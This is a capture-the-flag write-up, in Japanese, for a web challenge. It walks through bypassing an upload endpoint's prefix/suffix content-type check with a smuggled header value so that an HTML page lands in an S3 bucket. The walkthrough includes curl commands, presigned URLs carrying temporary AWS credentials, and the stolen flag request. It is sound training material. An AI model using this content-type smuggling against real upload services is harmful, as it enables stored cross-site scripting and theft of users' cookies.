# forward priority...:Validation Bypass:50pts
Is it really a good idea if the preffix match?  

- [Target](https://d2dy54wkxy5lef.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1R2SUwJksnLgWM7FSbFmJJEX39s5uc3lK/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.  

[https://d2dy54wkxy5lef.cloudfront.net/](https://d2dy54wkxy5lef.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様で、サイトの機能も同じであった。  
![site.png](site/site.png)  
ソースの主要箇所は以下の通りであった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const allowContentTypes = ['image/png', 'image/jpeg', 'image/jpg'];

  const isAllowContentType = allowContentTypes.filter((contentType) => request.body.contentType.startsWith(contentType) && request.body.contentType.endsWith(contentType));
  if (isAllowContentType.length === 0) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-length']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
`filter`により`contentType`をチェックしている。  
`['image/png', 'image/jpeg', 'image/jpg']`のどれかが`startsWith`かつ`endsWith`である必要があるようだ。  
これら関数は文字列にしか生えていないので、配列などのテクニックは利用できない。  
この時点で`image/png[何らかの文字]; charset=image/png`であろうことは確定する。  
何らかの文字を決めたいが、単に`text/html`ではいけないことは容易にわかる。  
ここで試しに`,`で区切って`image/png,text/html; charset=image/png`としてやることを思いつく。  
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":"image/png,text/html; charset=image/png","length":221}' --upload-file xs3.html 'https://d2dy54wkxy5lef.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-4-3-upload.s3.ap-northeast-1.amazonaws.com/upload/d0ff8639-681d-4432-9660-e98f6cbad339?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4ORKKPCFY%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T053617Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgVa2GgZ9IVYZ8IRkJ6ZCv629Jwlx1HCm9hpb%2Bd5VPCewCIESLuqPsgNyXs6TLyCDJN9iGOeJ1FXd8arI1I%2BDUY%2FmCKrsDCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMMzA4NTIxNDA3NzM2IgxycuSF3w824GiffPYqjwMULpygKaTJk2KsFdFDmYehSgAniXXGgo3MY0PA5dp0xFX6bNXHTBst3euE9HxiRi9OYJZd%2F3jkHb%2FV2BGaiV72Aq4Cuag2m8dFLODoFACciciahy1rqmlEHT0qauolubE5cuXrdzHY7J9sRhQZA4Kap5woFKEh55tse8xsRgC7fBKJjZ0RIUMmRtiFynhVouqBELqlUK9Xvrur1eEtXZOwUScc%2FWED2iNvlU84f%2F%2BH2eU%2BLsdw9vfXYu3nOsFiiTx0f8d9XVibV4PqNnztRr%2B0OHc9NakVMjMoQDIpwunnUKovS%2BBeHcnF0f%2FH7eAF017IvdqM92UaXrdXKZPZj07Z0lPxGUGeonfhs561wIpJsMG0J3Ghx3VVqfgUh1%2B48Qju2dEN7kOUn5eTSVRwIBsrMnpPa%2FUys%2FXF3Q8bW4YC30Me%2FuRnVZcsvL14HzHegNHk2I5VQ5sHBy2897JbBTidIof2soRJ%2F8s1QXYQ2lg9nhrwWNalwtj0ayWV5OvQB5zXNbzQ54DwEFQb9RfQ6vwwz6aZsAY6nwEtF00pkuxjJ1oTBcQLQu9qjpRjCK4%2FNOBPGN2ICHdR%2FAQbEB9HWN184QwhN4tHjE8x2qnjYXfe5fNpaZr%2Bz8yHjPS01tWjGqnVzBj%2BOFMKW5OePizAcAjwKE8QVpSnDtlsm6vfqz8OvKMZeLE99QpGde89Ue208z7Ick6frnSIkYvETbbxZWZ9QYSrCnmHLNreNizsYCWwlGhiT4sFUwg%3D&X-Amz-Signature=29cdffa291f54b12f5bf552377f5f0be0cd7914ec8458a80e1075214399ca108&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject","filename":"d0ff8639-681d-4432-9660-e98f6cbad339"}
$ curl -X PUT -H 'Content-Type: image/png,text/html; charset=image/png' --upload-file xs3.html 'https://uploadbucket-5b1bc63390-4-3-upload.s3.ap-northeast-1.amazonaws.com/upload/d0ff8639-681d-4432-9660-e98f6cbad339?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4ORKKPCFY%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T053617Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgVa2GgZ9IVYZ8IRkJ6ZCv629Jwlx1HCm9hpb%2Bd5VPCewCIESLuqPsgNyXs6TLyCDJN9iGOeJ1FXd8arI1I%2BDUY%2FmCKrsDCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMMzA4NTIxNDA3NzM2IgxycuSF3w824GiffPYqjwMULpygKaTJk2KsFdFDmYehSgAniXXGgo3MY0PA5dp0xFX6bNXHTBst3euE9HxiRi9OYJZd%2F3jkHb%2FV2BGaiV72Aq4Cuag2m8dFLODoFACciciahy1rqmlEHT0qauolubE5cuXrdzHY7J9sRhQZA4Kap5woFKEh55tse8xsRgC7fBKJjZ0RIUMmRtiFynhVouqBELqlUK9Xvrur1eEtXZOwUScc%2FWED2iNvlU84f%2F%2BH2eU%2BLsdw9vfXYu3nOsFiiTx0f8d9XVibV4PqNnztRr%2B0OHc9NakVMjMoQDIpwunnUKovS%2BBeHcnF0f%2FH7eAF017IvdqM92UaXrdXKZPZj07Z0lPxGUGeonfhs561wIpJsMG0J3Ghx3VVqfgUh1%2B48Qju2dEN7kOUn5eTSVRwIBsrMnpPa%2FUys%2FXF3Q8bW4YC30Me%2FuRnVZcsvL14HzHegNHk2I5VQ5sHBy2897JbBTidIof2soRJ%2F8s1QXYQ2lg9nhrwWNalwtj0ayWV5OvQB5zXNbzQ54DwEFQb9RfQ6vwwz6aZsAY6nwEtF00pkuxjJ1oTBcQLQu9qjpRjCK4%2FNOBPGN2ICHdR%2FAQbEB9HWN184QwhN4tHjE8x2qnjYXfe5fNpaZr%2Bz8yHjPS01tWjGqnVzBj%2BOFMKW5OePizAcAjwKE8QVpSnDtlsm6vfqz8OvKMZeLE99QpGde89Ue208z7Ick6frnSIkYvETbbxZWZ9QYSrCnmHLNreNizsYCWwlGhiT4sFUwg%3D&X-Amz-Signature=29cdffa291f54b12f5bf552377f5f0be0cd7914ec8458a80e1075214399ca108&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject'
```
通るようだ。  
さすがにContent-Typeが壊れてDLが始まるかと思うと予測する。  
試しに`https://d2dy54wkxy5lef.cloudfront.net/upload/d0ff8639-681d-4432-9660-e98f6cbad339`にアクセスするとHTMLが読み込まれJavaScriptが動いていた。  
これをクローラへ報告すればよい。  
以下のリクエストが届く。  
```
GET
/?satoki=flag=flag{f9eedd5f8b508ff8b03b803affb00d381826047b}
```
flagが得られた。  

## flag{f9eedd5f8b508ff8b03b803affb00d381826047b}